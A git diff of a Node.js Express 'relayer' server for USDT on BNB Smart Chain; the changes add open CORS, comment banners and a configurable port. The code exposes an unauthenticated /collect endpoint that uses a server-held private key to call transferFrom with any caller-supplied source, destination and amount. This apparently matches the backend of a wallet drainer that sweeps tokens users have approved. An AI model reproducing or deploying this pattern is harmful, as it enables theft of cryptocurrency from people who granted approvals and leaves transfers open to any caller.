@@ -1,22 +1,32 @@
 require("dotenv").config();
+
 const express = require("express");
+const cors = require("cors");
 const { ethers } = require("ethers");
 
 const app = express();
+
+app.use(cors());
 app.use(express.json());
 
+// =====================
 // BSC RPC
+// =====================
 const provider = new ethers.JsonRpcProvider(
   "https://bsc-dataseed.binance.org/"
 );
 
+// =====================
 // RELAYER WALLET
+// =====================
 const wallet = new ethers.Wallet(
   process.env.PRIVATE_KEY,
   provider
 );
 
-// USDT Contract
+// =====================
+// USDT CONTRACT
+// =====================
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
 
 const ABI = [
@@ -25,7 +35,9 @@ const ABI = [
 
 const token = new ethers.Contract(USDT, ABI, wallet);
 
-// ✅ STATUS ROUTE (browser open → JSON show)
+// =====================
+// STATUS ROUTE
+// =====================
 app.get("/", (req, res) => {
   res.json({
     status: true,
@@ -34,16 +46,23 @@ app.get("/", (req, res) => {
   });
 });
 
-// ✅ RELAYER ENDPOINT
+// =====================
+// RELAYER ENDPOINT
+// =====================
 app.post("/collect", async (req, res) => {
   try {
     const { from, to, amount } = req.body;
 
-    if (!from || !to || !amount)
-      return res.status(400).json({ success: false });
+    if (!from || !to || !amount) {
+      return res.status(400).json({
+        success: false,
+        message: "Missing parameters"
+      });
+    }
 
     console.log("Transfer request:", req.body);
 
+    // send transferFrom tx
     const tx = await token.transferFrom(from, to, amount);
 
     console.log("TX SENT:", tx.hash);
@@ -56,7 +75,8 @@ app.post("/collect", async (req, res) => {
     });
 
   } catch (err) {
-    console.log(err);
+    console.error(err);
+
     res.status(500).json({
       success: false,
       error: err.message
@@ -64,6 +84,11 @@ app.post("/collect", async (req, res) => {
   }
 });
 
-app.listen(3000, () =>
-  console.log("✅ Relayer running on port 3000")
+// =====================
+// SERVER START (Render Fix)
+// =====================
+const PORT = process.env.PORT || 10000;
+
+app.listen(PORT, () =>
+  console.log("✅ Relayer running on port", PORT)
 );
